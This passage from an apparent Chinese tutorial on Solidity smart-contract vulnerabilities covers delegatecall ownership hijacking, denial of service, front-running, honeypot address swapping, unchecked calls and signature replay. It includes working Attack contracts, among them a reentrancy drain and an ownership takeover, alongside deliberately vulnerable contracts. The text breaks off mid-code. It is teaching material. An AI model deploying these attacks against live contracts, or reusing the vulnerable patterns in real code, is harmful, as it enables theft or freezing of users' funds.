</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="数据私有属性的误解" tabindex="-1"><a class="header-anchor" href="#数据私有属性的误解" aria-hidden="true">#</a> 数据私有属性的误解</h3>`,8),E=n("code",null,"private",-1),I=n("code",null,"slot",-1),M={href:"https://zhuanlan.zhihu.com/p/463670521",target:"_blank",rel:"noopener noreferrer"},C=e(`<h3 id="delegatecall" tabindex="-1"><a class="header-anchor" href="#delegatecall" aria-hidden="true">#</a> delegatecall</h3><p>代理调用时会用调用者的上下文替代被调用者的上下文，例如下面 <code>HackMe</code> 中的回退函代理调用 <code>lib</code> 的 <code>pwn</code> 函数时，在 <code>lib</code> 中的变量 <code>owner</code> 将会是 <code>HackMe</code> 中的 <code>owner</code>，因此 <code>pwn()</code> 中修改的实际上的 <code>HackMe</code> 的 <code>owner</code>，<code>msg</code> 对象是 <code>HackMe</code> 中的 <code>msg</code> 对象，也就是调用 <code>HackMe</code> 的人。</p><p>例如：</p><p><code>Attack.attack </code> 调用 <code>HackMe</code> ，然后找不到 <code>pwn()</code> 这个函数签名，因此跳转到回退函数，然后回退函数调用 <code>Lib</code>，匹配到了函数签名，但是由于上下文切换，造成了 <code>HackMe</code> 的全局变量被意外修改。</p><div class="language-solidity line-numbers-mode" data-ext="solidity"><pre class="language-solidity"><code><span class="token comment">// SPDX-License-Identifier: MIT</span>
<span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.8.10</span><span class="token punctuation">;</span>

<span class="token keyword">contract</span> <span class="token class-name">Lib</span> <span class="token punctuation">{</span>
    <span class="token builtin">address</span> <span class="token keyword">public</span> owner<span class="token punctuation">;</span>

    <span class="token keyword">function</span> <span class="token function">pwn</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">{</span>
        owner <span class="token operator">=</span> msg<span class="token punctuation">.</span>sender<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">contract</span> <span class="token class-name">HackMe</span> <span class="token punctuation">{</span>
    <span class="token builtin">address</span> <span class="token keyword">public</span> owner<span class="token punctuation">;</span>
    Lib <span class="token keyword">public</span> lib<span class="token punctuation">;</span>

    <span class="token keyword">constructor</span><span class="token punctuation">(</span>Lib _lib<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        owner <span class="token operator">=</span> msg<span class="token punctuation">.</span>sender<span class="token punctuation">;</span>
        lib <span class="token operator">=</span> <span class="token function">Lib</span><span class="token punctuation">(</span>_lib<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token function">fallback</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">external</span> <span class="token keyword">payable</span> <span class="token punctuation">{</span>
        <span class="token builtin">address</span><span class="token punctuation">(</span>lib<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">delegatecall</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">contract</span> <span class="token class-name">Attack</span> <span class="token punctuation">{</span>
    <span class="token builtin">address</span> <span class="token keyword">public</span> hackMe<span class="token punctuation">;</span>

    <span class="token keyword">constructor</span><span class="token punctuation">(</span><span class="token builtin">address</span> _hackMe<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        hackMe <span class="token operator">=</span> _hackMe<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">function</span> <span class="token function">attack</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">{</span>
        hackMe<span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span>abi<span class="token punctuation">.</span><span class="token function">encodeWithSignature</span><span class="token punctuation">(</span><span class="token string">&quot;pwn()&quot;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="拒绝服务攻击" tabindex="-1"><a class="header-anchor" href="#拒绝服务攻击" aria-hidden="true">#</a> 拒绝服务攻击</h3><p>依赖某些特定条件才能执行的逻辑，如果有人恶意破坏并且没有检查是否满足条件，就会造成服务中断。</p><p>例如下面的例子：依赖接收者可以接收以太币，但是如果接收以太币的合约无 <code>receive</code> 函数或者 <code>fallback</code> 函数，就会让逻辑无法进行下去。</p><p>多人竞拍，如果有出价更高的则退回上个一竞拍者的以太币，并且更新胜出者 <code>king</code> 和当前标价 <code>balance</code>，<code>Attack</code> 合约参与竞拍，但是无法退回以太币给它，导致 DOS。</p><div class="language-solidity line-numbers-mode" data-ext="solidity"><pre class="language-solidity"><code><span class="token comment">// SPDX-License-Identifier: MIT</span>
<span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.8.10</span><span class="token punctuation">;</span>

<span class="token keyword">contract</span> <span class="token class-name">KingOfEther</span> <span class="token punctuation">{</span>
    <span class="token builtin">address</span> <span class="token keyword">public</span> king<span class="token punctuation">;</span>
    <span class="token builtin">uint</span> <span class="token keyword">public</span> balance<span class="token punctuation">;</span>

    <span class="token keyword">function</span> <span class="token function">claimThrone</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">external</span> <span class="token keyword">payable</span> <span class="token punctuation">{</span>
        <span class="token keyword">require</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>value <span class="token operator">&gt;</span> balance<span class="token punctuation">,</span> <span class="token string">&quot;Need to pay more to become the king&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token punctuation">(</span><span class="token builtin">bool</span> sent<span class="token punctuation">,</span> <span class="token punctuation">)</span> <span class="token operator">=</span> king<span class="token punctuation">.</span>call<span class="token punctuation">{</span>value<span class="token punctuation">:</span> balance<span class="token punctuation">}</span><span class="token punctuation">(</span><span class="token string">&quot;&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">require</span><span class="token punctuation">(</span>sent<span class="token punctuation">,</span> <span class="token string">&quot;Failed to send Ether&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        balance <span class="token operator">=</span> msg<span class="token punctuation">.</span>value<span class="token punctuation">;</span>
        king <span class="token operator">=</span> msg<span class="token punctuation">.</span>sender<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">contract</span> <span class="token class-name">Attack</span> <span class="token punctuation">{</span>
    KingOfEther kingOfEther<span class="token punctuation">;</span>

    <span class="token keyword">constructor</span><span class="token punctuation">(</span>KingOfEther _kingOfEther<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        kingOfEther <span class="token operator">=</span> <span class="token function">KingOfEther</span><span class="token punctuation">(</span>_kingOfEther<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">function</span> <span class="token function">attack</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token keyword">payable</span> <span class="token punctuation">{</span>
        kingOfEther<span class="token punctuation">.</span>claimThrone<span class="token punctuation">{</span>value<span class="token punctuation">:</span> msg<span class="token punctuation">.</span>value<span class="token punctuation">}</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="交易顺序依赖" tabindex="-1"><a class="header-anchor" href="#交易顺序依赖" aria-hidden="true">#</a> 交易顺序依赖</h3><p>某些合约依赖收到交易地顺序，例如某些竞猜或者首发，“<strong>第一个</strong>” 之类的要求，那么就容易出现抢跑 (front run) 的情况。再例如，利用不同代币汇率差别，观察交易池，抢先在汇率变化之前完成交易。</p><p>下面是通过哈希值竞猜，观察交易池，以更高的 gasprice 抢跑。</p><div class="language-solidity line-numbers-mode" data-ext="solidity"><pre class="language-solidity"><code><span class="token comment">// SPDX-License-Identifier: MIT</span>
<span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.8.10</span><span class="token punctuation">;</span>

<span class="token keyword">contract</span> <span class="token class-name">FindThisHash</span> <span class="token punctuation">{</span>
    <span class="token builtin">bytes32</span> <span class="token keyword">public</span> <span class="token keyword">constant</span> hash <span class="token operator">=</span>
        <span class="token number">0x564ccaf7594d66b1eaaea24fe01f0585bf52ee70852af4eac0cc4b04711cd0e2</span><span class="token punctuation">;</span>

    <span class="token keyword">constructor</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">payable</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>

    <span class="token keyword">function</span> <span class="token function">solve</span><span class="token punctuation">(</span><span class="token builtin">string</span> <span class="token keyword">memory</span> solution<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">{</span>
        <span class="token keyword">require</span><span class="token punctuation">(</span>hash <span class="token operator">==</span> <span class="token function">keccak256</span><span class="token punctuation">(</span>abi<span class="token punctuation">.</span><span class="token function">encodePacked</span><span class="token punctuation">(</span>solution<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">&quot;Incorrect answer&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token punctuation">(</span><span class="token builtin">bool</span> sent<span class="token punctuation">,</span> <span class="token punctuation">)</span> <span class="token operator">=</span> msg<span class="token punctuation">.</span>sender<span class="token punctuation">.</span>call<span class="token punctuation">{</span>value<span class="token punctuation">:</span> <span class="token number">10</span> ether<span class="token punctuation">}</span><span class="token punctuation">(</span><span class="token string">&quot;&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">require</span><span class="token punctuation">(</span>sent<span class="token punctuation">,</span> <span class="token string">&quot;Failed to send Ether&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="使用未初始化的内存" tabindex="-1"><a class="header-anchor" href="#使用未初始化的内存" aria-hidden="true">#</a> 使用未初始化的内存</h3><p>根据 Solidity 的编译器，如果需要临时存储的操作需要大于 64 字节的空间，那么不会放入 <code>0x00-0x3f</code> 的暂存空间，又考虑到临时存储的生命周期很短，因此直接在当前内存指针的下一个位置写入，但是内存指针不变，0x40-0x5f 记录的内存大小也不变，然后继续写入内存时直接覆盖。因此，在直接操作未使用的内存时，这块内存可能不是初始值。</p><p>如果在函数中声明 memory 变量，它可能不是初始值。</p><h3 id="权限设置不当" tabindex="-1"><a class="header-anchor" href="#权限设置不当" aria-hidden="true">#</a> 权限设置不当</h3><p>取币、自毁操作需要设置严格的权限。建议非必要，不要设置 <code>selfdestruct</code> 函数。</p><h3 id="合约实例偷换地址" tabindex="-1"><a class="header-anchor" href="#合约实例偷换地址" aria-hidden="true">#</a> 合约实例偷换地址</h3><p>例如，下面的 <code>Bank</code> 合约具有重入漏洞，似乎也只是多了一个 <code>Logger</code> 合约作为日志记录者。但是实际上，部署 <code>Bank</code> 的人可以在部署 <code>Bank</code> 时不填 <code>Logger</code> 的地址，而是直接填入 <code>HoneyPot</code> 的地址。在合约实例的名字的误导下，如果不去检查合约实例的地址上是否真的为预期内的代码，那么很容易上当。</p><div class="language-solidity line-numbers-mode" data-ext="solidity"><pre class="language-solidity"><code><span class="token comment">// SPDX-License-Identifier: MIT</span>
<span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.8.10</span><span class="token punctuation">;</span>

<span class="token keyword">contract</span> <span class="token class-name">Bank</span> <span class="token punctuation">{</span>
    <span class="token keyword">mapping</span><span class="token punctuation">(</span><span class="token builtin">address</span> <span class="token operator">=&gt;</span> <span class="token builtin">uint</span><span class="token punctuation">)</span> <span class="token keyword">public</span> balances<span class="token punctuation">;</span>
    Logger logger<span class="token punctuation">;</span>

    <span class="token keyword">constructor</span><span class="token punctuation">(</span>Logger _logger<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        logger <span class="token operator">=</span> <span class="token function">Logger</span><span class="token punctuation">(</span>_logger<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">function</span> <span class="token function">deposit</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token keyword">payable</span> <span class="token punctuation">{</span>
        balances<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span> <span class="token operator">+=</span> msg<span class="token punctuation">.</span>value<span class="token punctuation">;</span>
        logger<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">,</span> msg<span class="token punctuation">.</span>value<span class="token punctuation">,</span> <span class="token string">&quot;Deposit&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">function</span> <span class="token function">withdraw</span><span class="token punctuation">(</span><span class="token builtin">uint</span> _amount<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">{</span>
        <span class="token keyword">require</span><span class="token punctuation">(</span>_amount <span class="token operator">&lt;=</span> balances<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">&quot;Insufficient funds&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token punctuation">(</span><span class="token builtin">bool</span> sent<span class="token punctuation">,</span> <span class="token punctuation">)</span> <span class="token operator">=</span> msg<span class="token punctuation">.</span>sender<span class="token punctuation">.</span>call<span class="token punctuation">{</span>value<span class="token punctuation">:</span> _amount<span class="token punctuation">}</span><span class="token punctuation">(</span><span class="token string">&quot;&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">require</span><span class="token punctuation">(</span>sent<span class="token punctuation">,</span> <span class="token string">&quot;Failed to send Ether&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        balances<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span> <span class="token operator">-=</span> _amount<span class="token punctuation">;</span>

        logger<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">,</span> _amount<span class="token punctuation">,</span> <span class="token string">&quot;Withdraw&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">contract</span> <span class="token class-name">Logger</span> <span class="token punctuation">{</span>
    <span class="token keyword">event</span> <span class="token function">Log</span><span class="token punctuation">(</span><span class="token builtin">address</span> caller<span class="token punctuation">,</span> <span class="token builtin">uint</span> amount<span class="token punctuation">,</span> <span class="token builtin">string</span> action<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">function</span> <span class="token function">log</span><span class="token punctuation">(</span>
        <span class="token builtin">address</span> _caller<span class="token punctuation">,</span>
        <span class="token builtin">uint</span> _amount<span class="token punctuation">,</span>
        <span class="token builtin">string</span> <span class="token keyword">memory</span> _action
    <span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">{</span>
        <span class="token keyword">emit</span> <span class="token function">Log</span><span class="token punctuation">(</span>_caller<span class="token punctuation">,</span> _amount<span class="token punctuation">,</span> _action<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token comment">// Hacker tries to drain the Ethers stored in Bank by reentrancy.</span>
<span class="token keyword">contract</span> <span class="token class-name">Attack</span> <span class="token punctuation">{</span>
    Bank bank<span class="token punctuation">;</span>

    <span class="token keyword">constructor</span><span class="token punctuation">(</span>Bank _bank<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        bank <span class="token operator">=</span> <span class="token function">Bank</span><span class="token punctuation">(</span>_bank<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token function">fallback</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">external</span> <span class="token keyword">payable</span> <span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token builtin">address</span><span class="token punctuation">(</span>bank<span class="token punctuation">)</span><span class="token punctuation">.</span>balance <span class="token operator">&gt;=</span> <span class="token number">1</span> ether<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            bank<span class="token punctuation">.</span><span class="token function">withdraw</span><span class="token punctuation">(</span><span class="token number">1</span> ether<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">function</span> <span class="token function">attack</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token keyword">payable</span> <span class="token punctuation">{</span>
        bank<span class="token punctuation">.</span>deposit<span class="token punctuation">{</span>value<span class="token punctuation">:</span> <span class="token number">1</span> ether<span class="token punctuation">}</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        bank<span class="token punctuation">.</span><span class="token function">withdraw</span><span class="token punctuation">(</span><span class="token number">1</span> ether<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">function</span> <span class="token function">getBalance</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token keyword">view</span> <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">uint</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span> <span class="token builtin">address</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">.</span>balance<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token comment">// Let&#39;s say this code is in a separate file so that others cannot read it.</span>
<span class="token keyword">contract</span> <span class="token class-name">HoneyPot</span> <span class="token punctuation">{</span>
    <span class="token keyword">function</span> <span class="token function">log</span><span class="token punctuation">(</span>
        <span class="token builtin">address</span> _caller<span class="token punctuation">,</span>
        <span class="token builtin">uint</span> _amount<span class="token punctuation">,</span>
        <span class="token builtin">string</span> <span class="token keyword">memory</span> _action
    <span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">equal</span><span class="token punctuation">(</span>_action<span class="token punctuation">,</span> <span class="token string">&quot;Withdraw&quot;</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">revert</span><span class="token punctuation">(</span><span class="token string">&quot;It&#39;s a trap&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>

    <span class="token comment">// Function to compare strings using keccak256</span>
    <span class="token keyword">function</span> <span class="token function">equal</span><span class="token punctuation">(</span><span class="token builtin">string</span> <span class="token keyword">memory</span> _a<span class="token punctuation">,</span> <span class="token builtin">string</span> <span class="token keyword">memory</span> _b<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token keyword">pure</span> <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">bool</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span> <span class="token function">keccak256</span><span class="token punctuation">(</span>abi<span class="token punctuation">.</span><span class="token function">encode</span><span class="token punctuation">(</span>_a<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token function">keccak256</span><span class="token punctuation">(</span>abi<span class="token punctuation">.</span><span class="token function">encode</span><span class="token punctuation">(</span>_b<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="未检查底层调用结果" tabindex="-1"><a class="header-anchor" href="#未检查底层调用结果" aria-hidden="true">#</a> 未检查底层调用结果</h3><p><code>call</code> 这类底层调用的方式失败并不会发生回滚。因此，攻击者可以精心设计 gas，让底层调用回滚，而其他语句继续运行。</p><h3 id="签名重放" tabindex="-1"><a class="header-anchor" href="#签名重放" aria-hidden="true">#</a> 签名重放</h3><p>一般而言，签名会和特定的交易或者消息绑定，但是为了业务逻辑自己设计的多重签名，可能会疏忽造成签名重复使用。例如下面的 <code>transfer</code> 函数，通过库合约恢复发送者地址，但是如果签名是可重用的，那么就会造成意外的取款行为。</p><div class="language-solidity line-numbers-mode" data-ext="solidity"><pre class="language-solidity"><code><span class="token comment">// SPDX-License-Identifier: MIT</span>
<span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.8.0</span><span class="token punctuation">;</span>
<span class="token keyword">pragma</span> experimental ABIEncoderV2<span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token string">&quot;https://github.com/OpenZeppelin/openzeppelin-contracts/blob/b0cf6fbb7a70f31527f36579ad644e1cf12fdf4e/contracts/utils/cryptography/ECDSA.sol&quot;</span><span class="token punctuation">;</span>

<span class="token keyword">contract</span> <span class="token class-name">MultiSigWallet</span> <span class="token punctuation">{</span>
    <span class="token keyword">using</span> <span class="token class-name">ECDSA</span> <span class="token keyword">for</span> <span class="token builtin">bytes32</span><span class="token punctuation">;</span>

    <span class="token builtin">address</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token keyword">public</span> owners<span class="token punctuation">;</span>

    <span class="token keyword">constructor</span><span class="token punctuation">(</span><span class="token builtin">address</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token keyword">memory</span> _owners<span class="token punctuation">)</span> <span class="token keyword">payable</span> <span class="token punctuation">{</span>
        owners <span class="token operator">=</span> _owners<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">function</span> <span class="token function">deposit</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">external</span> <span class="token keyword">payable</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>

    <span class="token keyword">function</span> <span class="token function">transfer</span><span class="token punctuation">(</span>
        <span class="token builtin">address</span> _to<span class="token punctuation">,</span>
        <span class="token builtin">uint</span> _amount<span class="token punctuation">,</span>
        <span class="token builtin">bytes</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token keyword">memory</span> _sigs
    <span class="token punctuation">)</span> <span class="token keyword">external</span> <span class="token punctuation">{</span>
        <span class="token builtin">bytes32</span> txHash <span class="token operator">=</span> <span class="token function">getTxHash</span><span class="token punctuation">(</span>_to<span class="token punctuation">,</span> _amount<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">require</span><span class="token punctuation">(</span><span class="token function">_checkSigs</span><span class="token punctuation">(</span>_sigs<span class="token punctuation">,</span> txHash<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">&quot;invalid sig&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token punctuation">(</span><span class="token builtin">bool</span> sent<span class="token punctuation">,</span> <span class="token punctuation">)</span> <span class="token operator">=</span> _to<span class="token punctuation">.</span>call<span class="token punctuation">{</span>value<span class="token punctuation">:</span> _amount<span class="token punctuation">}</span><span class="token punctuation">(</span><span class="token string">&quot;&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">require</span><span class="token punctuation">(</span>sent<span class="token punctuation">,</span> <span class="token string">&quot;Failed to send Ether&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">function</span> <span class="token function">getTxHash</span><span class="token punctuation">(</span><span class="token builtin">address</span> _to<span class="token punctuation">,</span> <span class="token builtin">uint</span> _amount<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token keyword">view</span> <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">bytes32</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span> <span class="token function">keccak256</span><span class="token punctuation">(</span>abi<span class="token punctuation">.</span><span class="token function">encodePacked</span><span class="token punctuation">(</span>_to<span class="token punctuation">,</span> _amount<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">function</span> <span class="token function">_checkSigs</span><span class="token punctuation">(</span><span class="token builtin">bytes</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token keyword">memory</span> _sigs<span class="token punctuation">,</span> <span class="token builtin">bytes32</span> _txHash<span class="token punctuation">)</span>
        <span class="token keyword">private</span>
        <span class="token keyword">view</span>
        <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">bool</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token builtin">bytes32</span> ethSignedHash <span class="token operator">=</span> _txHash<span class="token punctuation">.</span><span class="token function">toEthSignedMessageHash</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

